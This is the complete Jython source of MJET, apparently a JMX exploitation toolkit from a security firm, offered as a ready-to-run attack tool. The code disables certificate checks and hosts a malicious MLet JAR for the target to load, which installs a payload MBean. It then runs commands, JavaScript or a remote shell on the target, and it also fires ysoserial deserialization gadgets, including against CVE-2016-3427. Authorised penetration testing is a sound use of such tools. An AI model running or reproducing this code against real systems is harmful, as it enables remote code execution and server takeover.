# jmx stuff
from javax.management import ObjectName
from java.lang import String
from java.lang import Object
from jarray import array
from java.io import IOException
from javax.net.ssl import TrustManager, X509TrustManager
from javax.net.ssl import SSLContext
from java.lang import System
# BaseHTTPServer needed to serve mlets
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from threading import Thread

import sys
import os
import time
import jarray
from jarray import array


# Extra
import argparse
import base64
import random
import string

# Socket to generate a proxy for localhost bypasses
import socket


authorSignature = 'MJET - MOGWAI LABS JMX Exploitation Toolkit\n'
authorSignature += '==========================================='


class TrustAllX509TrustManager(X509TrustManager):
    def checkClientTrusted(self, chain, auth):
        pass

    def checkServerTrusted(self, chain, auth):
        pass

    def getAcceptedIssuers(self):
        return None


### AUX ###
def jmxmp_url(args):
    print "[+] Using JMX Message Protocol"
    if not os.path.isfile("./jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"):
        print "[-] Error: Did not find opendmk_jmxremote_optional_jar-1.0-b01-ea.jar in jars directory. Please download it from https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea and move it into the jars directory"
        print "[-] Example: java -cp jython.jar:jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar org.python.util.jython mjet.py ..."
        sys.exit(1)

    print "[+] Using opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"
        
    from javax.management.remote import JMXServiceURL
    jmx_url = JMXServiceURL("service:jmx:jmxmp://" +
                            args.targetHost + ":" + args.targetPort + "/")
    return jmx_url


def jxmrmi_url(args):
    print "[+] Using JMX RMI"

    from javax.management.remote import JMXServiceURL

    jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" +
                            args.targetHost + ":" + args.targetPort + "/" + args.rmiObjectName)
    return jmx_url


def connectToJMX(args):
    # Basic JMX connection, always required
    trust_managers = array([TrustAllX509TrustManager()], TrustManager)

    sc = SSLContext.getInstance("SSL")
    sc.init(None, trust_managers, None)
    SSLContext.setDefault(sc)

    if args.jmxmp:
        jmx_url = jmxmp_url(args)
    else:
        jmx_url = jxmrmi_url(args)

    # import after url in order to import the correct protocol implementation
    from javax.management.remote import JMXConnector
    from javax.management.remote import JMXConnectorFactory

    print "[+] Connecting to: " + str(jmx_url)
    try:
        # for passing credentials for password
        if args.jmxpassword and args.jmxrole:
            print("[+] Using credentials: " + str(args.jmxrole) +
                  " / " + str(args.jmxpassword))
            credentials = array([args.jmxrole, args.jmxpassword], String)
            environment = {JMXConnector.CREDENTIALS: credentials}
            jmx_connector = JMXConnectorFactory.connect(jmx_url, environment)
        else:
            jmx_connector = JMXConnectorFactory.connect(jmx_url)

        print "[+] Connected: " + str(jmx_connector.getConnectionId())
        bean_server = jmx_connector.getMBeanServerConnection()
        return bean_server
    except:
        print "[-] Error: Can't connect to remote service"

        if "Authentication failed! Invalid username or password" in str(sys.exc_info()[1]):
            print "[-] Authentication failed! Invalid username or password"

        if "Connection refused to host: 127.0.0.1" in str(sys.exc_info()):
            print "[-] Connection refused to 127.0.0.1! Try the localhost_bypass"

        sys.exit(-1)
##########

### WEBSERVER MODE ###


def webserverMode(args):
    startWebserver(args)
    raw_input("[+] Press Enter to stop the service\n")

### /WEBSERVER MODE ###

### INSTALL MODE ###


def installMode(args):
    startWebserver(args)
    bean_server = connectToJMX(args)
    installMBean(args, bean_server)
    print "[+] Done"


def installMBean(args, bean_server):
    # Installation, load javax.management.loading.MLet to install additional MBeans
    # If loading fails, the Mlet is already loaded...
    try:
        mlet_bean = bean_server.createMBean(
            "javax.management.loading.MLet", None)
    except:
        # MLet Bean can't be created because it already exists
        mlet_bean = bean_server.getObjectInstance(
            ObjectName("DefaultDomain:type=MLet"))

    print "[+] Loaded " + str(mlet_bean.getClassName())

    # Install payload Mlet via getMbeansFromURL
    # pass the URL of the web server
    print "[+] Loading malicious MBean from " + args.payload_url
    print "[+] Invoking: " + mlet_bean.getClassName() + ".getMBeansFromURL"

    inv_array1 = jarray.zeros(1, Object)
    inv_array1[0] = args.payload_url

    inv_array2 = jarray.zeros(1, String)
    inv_array2[0] = String.canonicalName

    resource = bean_server.invoke(
        mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)

    # Check if the Mlet was loaded successfully

    for res in resource:
        if res.__class__.__name__ == "InstanceAlreadyExistsException":
            print "[+] Object instance already existed, no need to install it a second time"
        elif res.__class__.__name__ == "ObjectInstance":
            print "[+] Successfully loaded MBean" + str(res.getObjectName())

            # Change the password from "I+n33d+a+glass+0f+watta" to the new value
            print "[+] Changing default password..."
            changePassword("I+n33d+a+glass+0f+watta",
                           args.password, bean_server)
        else:
            print res


def startWebserver(args):
    # Start a web server on all ports in a seperate thread
    # Only needed during installation
    print "[+] Starting webserver at port " + str(args.payload_port)
    mletHandler = MakeHandlerClass(args.payload_url)
    mlet_webserver = HTTPServer(('', int(args.payload_port)), mletHandler)
    webserver_thread = Thread(target=mlet_webserver.serve_forever)
    webserver_thread.daemon = True
    try:
        webserver_thread.start()
    except KeyboardInterrupt:
        mlet_webserver.shutdown()
        sys.exit(0)


def MakeHandlerClass(base_url):
    # This class will handles any incoming request from
    # the JMX service
    # Needed during installation of the JAR
    class CustomHandler(BaseHTTPRequestHandler):

        def __init__(self, *args, **kwargs):
            self._base_url = base_url
            self.jar_name = ''.join(random.choice(
                string.ascii_lowercase) for _ in range(8)) + '.jar'
            BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

        # Handler for the GET requests
        def do_GET(self):
            if self.path == "/":
                mlet_code = '<html><mlet code="de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload" archive="' + \
                    self.jar_name + '" name="MogwaiLabs:name=payload,id=1" codebase="' + \
                    self._base_url + '"></mlet></html>'

                self.send_response(200)
                self.send_header('Pragma', 'no-cache')
                self.end_headers()
                self.wfile.write(mlet_code)

            elif self.path.endswith('.jar'):
                f = open("./payloads/MogwaiLabsMJET-MLet.jar")
                self.send_response(200)
                self.send_header('Content-type', 'application/jar')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()

            else:
                self.send_error(404, 'File not found: ' + self.path)
                #
                # except IOError:
                #   self.send_error(404,'File Not Found: %s' % self.path)

    return CustomHandler

### /INSTALL MODE ###


### UNINSTALL MODE ###
def uninstallMode(args):
    bean_server = connectToJMX(args)
    uninstallMBeans(bean_server)
    print "[+] Done"


def uninstallMBeans(bean_server):
    try:
        bean_server.unregisterMBean(ObjectName("MogwaiLabs:name=payload,id=1"))
    except:
        print "[-] Error: The MBean is not registered in the target server"
        sys.exit(0)
    print "[+] MBean correctly uninstalled"

### /UNINSTALL MODE ###


### CHANGE PASSWORD MODE ###

def changePasswordMode(args):
    bean_server = connectToJMX(args)
    changePassword(args.password, args.newpass, bean_server)
    print "[+] Done"


def changePassword(password, newpass, bean_server):
    # Payload execution
    # Load the Payload Met and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(
        ObjectName("MogwaiLabs:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = newpass

    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(
        mlet_bean.getObjectName(), "changePassword", inv_array1, inv_array2)

    if str(resource) == "True":
        print "[+] Successfully changed password"
    else:
        print "[-] Unable to change password"

    sys.stdout.flush()

### /CHANGE PASSWORD MODE ###


### COMMAND MODE ###

def commandMode(args):
    bean_server = connectToJMX(args)
    executeCommand(args.password, args.cmd, bean_server, args.shell)
    print "[+] Done"


def executeCommand(password, cmd, bean_server, shell):
    # Payload execution
    # Load the Payload MLet and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(
        ObjectName("MogwaiLabs:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Executing command: " + cmd
    inv_array1 = jarray.zeros(3, Object)
    inv_array1[0] = password
    inv_array1[1] = cmd
    inv_array1[2] = shell

    inv_array2 = jarray.zeros(3, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName
    inv_array2[2] = String.canonicalName
    
    resource = bean_server.invoke(
        mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)

    print resource

    sys.stdout.write("\n")
    sys.stdout.flush()

### /COMMAND MODE ###

### JAVASCRIPT MODE ###


def scriptMode(args):
    bean_server = connectToJMX(args)

    with open(args.filename, 'r') as myfile:
        script = myfile.read()

    executeJS(args.password, script, bean_server)
    print "[+] Done"


def executeJS(password, js, bean_server):
    # Payload execution
    # Load the Payload MLet and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(
        ObjectName("MogwaiLabs:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Executing script"
    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = js

    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(
        mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)

    if resource is not None:
        print resource

    sys.stdout.write("\n")
    sys.stdout.flush()

### /JAVASCRIPT MODE ###


### SHELL MODE ###

def shellMode(args):
    bean_server = connectToJMX(args)
    startShell(args.password, bean_server)
    print "[+] Done"


def startShell(password, bean_server):
    print "[+] Use command 'exit_shell' to exit the shell"
    in_command_loop = True
    while in_command_loop:
        cmd = raw_input(">>> ")
        if cmd == 'exit_shell':
            in_command_loop = False
        else:
            executeCommand(password, cmd, bean_server)

### /SHELL MODE ###

### DESERIALIZATION MODE ###


def deserializationMode(args):

    if not os.path.isfile('./jars/ysoserial.jar'):
        print "[-] Error: Did not find ysoserial.jar in jars directory. Please download it from https://github.com/frohoff/ysoserial and move it in the jars directory"
        sys.exit(1)

    sys.path.append("./jars/ysoserial.jar")
    print "[+] Added ysoserial API capacities"

    from ysoserial.payloads.ObjectPayload import Utils

    # Connect to the JMX server
    bean_server = connectToJMX(args)

    # Generate deserialization object with ysoserial.jar
    payload_object = Utils.makePayloadObject(args.gadget, args.cmd)

    # Command execution
    # Load default MLet java.util.logging and invoke method getLoggerLevel on it
    mlet_bean = bean_server.getObjectInstance(
        ObjectName("java.util.logging:type=Logging"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Passing ysoserial object as parameter to getLoggerLevel(String loglevel)"
    inv_array1 = jarray.zeros(1, Object)
    inv_array1[0] = payload_object

    inv_array2 = jarray.zeros(1, String)
    inv_array2[0] = String.canonicalName

    try:
        resource = bean_server.invoke(
            mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)

    except:
        if "argument type mismatch" in str(sys.exc_info()[1]):
            print "[+] Got an argument type mismatch exception - this is expected"

        elif "Access denied! Invalid access level" in str(sys.exc_info()[1]):
            print "[+] Got an access denied exception - this is expected"
        else:
            print "[-] Got a " + str(sys.exc_info()[1]) + "exception, exploitation failed"

    sys.stdout.write("\n")
    sys.stdout.flush()

    print "[+] Done"

### /DESERIALIZATION MODE ###

### cve_2016_3427 MODE ###

def cve_2016_3427Mode(args):
    if not os.path.isfile('./jars/ysoserial.jar'):
        print "[-] Error: Did not find ysoserial.jar in jars directory. Please download it from https://github.com/frohoff/ysoserial and move it in the jars directory"
        sys.exit(1)

    sys.path.append("./jars/ysoserial.jar")
    print "[+] Added ysoserial API capacities"

    from ysoserial.payloads.ObjectPayload import Utils
    payload_object = Utils.makePayloadObject(args.gadget, args.cmd)

    trust_managers = array([TrustAllX509TrustManager()], TrustManager)

    sc = SSLContext.getInstance("SSL")
    sc.init(None, trust_managers, None)
    SSLContext.setDefault(sc)

    from javax.management.remote import JMXConnector
    from javax.management.remote import JMXConnectorFactory

    jmx_url = jxmrmi_url(args)

    print "[+] Connecting to: " + str(jmx_url)
    try:
        environment = {JMXConnector.CREDENTIALS: payload_object}
        jmx_connector = JMXConnectorFactory.connect(jmx_url, environment)
    except:
        if "java.io.InvalidClassException: filter status: REJECTED" in str(sys.exc_info()):
            print "[-] Not vulnerable"
        elif "Credentials should be String[]" in str(sys.exc_info()):
            print "[+] Object was deserialized, target could be vulnerable"
        
        print "[?]: Returned error: "
        print str(sys.exc_info())

    print "[+] Done"


### /cve_2016_3427 MODE ###


### Proxy for localhost bypass ###


def runProxy(target, port):
    try:
        # server socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("127.0.0.1", port))
        server.listen(1)
        local_socket, address = server.accept()

        # client socket
        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_socket.connect((target, port))
    except socket.error as e:
        print "[-] Error: Failed to start localhost proxy with port " + str(port)
        if "Address already in use" in e:
            print "[-] Port " + str(port) + " is already in use!"
        sys.exit(1)  # kil the thread

    local_to_remote = Thread(
        target=proxyHandler, args=(local_socket, remote_socket))
    local_to_remote.daemon = True
    local_to_remote.start()

    remote_to_local = Thread(
        target=proxyHandler, args=(remote_socket, local_socket))
    remote_to_local.daemon = True
    remote_to_local.start()

    print "[+] Started localhost proxy on port " + str(port)



def proxyHandler(source, dest):
    while 1:
        try:
            data = source.recv(1024)
            if not data:
                break
            dest.send(data)
        except:
            break

### /Proxy for localhost bypass ###

### PARSER ###
# Map for clarity's sake


def arg_install_mode(args):
    installMode(args)


def arg_command_mode(args):
    commandMode(args)


def arg_script_mode(args):
    scriptMode(args)


def arg_shell_mode(args):
    shellMode(args)


def arg_password_mode(args):
    changePasswordMode(args)


def arg_uninstall_mode(args):
    uninstallMode(args)


def arg_webserver_mode(args):
    webserverMode(args)


def arg_deserialization_mode(args):
    deserializationMode(args)

def arg_cve_2016_3427_mode(args):
    cve_2016_3427Mode(args)


# print header
print ""
print authorSignature

# Base parser
parser = argparse.ArgumentParser(description='MJET allows an easy exploitation of insecure JMX services',
                                 epilog='--- MJET - MOGWAI LABS JMX Exploitation Toolkit ------------------', add_help=True)
parser.add_argument('targetHost', help='target IP address')
parser.add_argument('targetPort', help='target JMX service port')
parser.add_argument('--jmxrole', help='remote JMX role')
parser.add_argument('--jmxpassword', help='remote JMX password')
parser.add_argument('--jmxmp', action='store_true',
                    help='Use JMX Message Protocol')
parser.add_argument('--shell', help='run with custom shell')
parser.add_argument('--rmiObjectName', help='RMI name of the JMX endpoint', default='jmxrmi')
parser.add_argument('--localhost_bypass',
                    default=None,
                    dest="localhost_bypass_port",
                    action='store',
                    nargs='?',
                    type=int,
                    help='JMX RemoteObject port')

subparsers = parser.add_subparsers(
    title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')

# Install mode
install_subparser = subparsers.add_parser(
    'install', help='install the payload MBean on the target')
install_subparser.add_argument(
    'password', help="the password that should be set after successful installation")
install_subparser.add_argument(
    'payload_url', help='URL to load the payload (full URL)')
install_subparser.add_argument('payload_port', help='port to load the payload')
install_subparser.set_defaults(func=arg_install_mode)

# Uninstall mode
uninstall_subparser = subparsers.add_parser(
    'uninstall', help='uninstall the payload MBean from the target')
uninstall_subparser.set_defaults(func=arg_uninstall_mode)

# Password mode
password_subparser = subparsers.add_parser(
    'changepw', help='change the payload password on the target')
password_subparser.add_argument(
    'password', help="the password to access the installed MBean")
password_subparser.add_argument('newpass', help='The new password')
password_subparser.set_defaults(func=arg_password_mode)

# Command mode
command_subparser = subparsers.add_parser(
    'command', help='execute a command in the target')
command_subparser.add_argument(
    'password', help="the password to access the installed MBean")
command_subparser.add_argument('cmd', help='command to be executed')
command_subparser.set_defaults(func=arg_command_mode)

# Javascript mode
script_subparser = subparsers.add_parser(
    'javascript', help='execute JavaScript code from a file in the target')
script_subparser.add_argument(
    'password', help="the password to access the installed MBean")
script_subparser.add_argument(
    'filename', help='file with the JavaScript code to be executed')
script_subparser.set_defaults(func=arg_script_mode)

# Shell mode
shell_subparser = subparsers.add_parser(
    'shell', help='open a simple command shell in the target')
shell_subparser.add_argument(
    'password', help="the required password to access the installed MBean")
shell_subparser.set_defaults(func=arg_shell_mode)

# Webserver mode
webserver_subparser = subparsers.add_parser(
    'webserver', help='just run the MLET web server')
webserver_subparser.add_argument(
    'payload_url', help='URL to load the payload (full URL)')
webserver_subparser.add_argument(
    'payload_port', help='port to load the system')
webserver_subparser.set_defaults(func=arg_webserver_mode)


# Deserialization mode
deserialize_subparser = subparsers.add_parser(
    'deserialize', help='send a ysoserial payload to the target')
deserialize_subparser.add_argument(
    'gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
deserialize_subparser.add_argument('cmd', help='command to be executed')
deserialize_subparser.set_defaults(func=arg_deserialization_mode)

# CVE-2016-3427 mode
cve_2016_3427_subparser = subparsers.add_parser(
    'cve-2016-3427', help='Sends a ysoserial payload to JMX authentication (CVE-2016-3427)')
cve_2016_3427_subparser.add_argument(
    'gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
cve_2016_3427_subparser.add_argument('cmd', help='command to be executed')
cve_2016_3427_subparser.set_defaults(func=arg_cve_2016_3427_mode)

# Store the user args
args = parser.parse_args()

if args.localhost_bypass_port:
    proxyServer = Thread(
        target=runProxy, args=(args.targetHost, args.localhost_bypass_port))
    proxyServer.daemon = True
    proxyServer.start()

    
args.func(args)
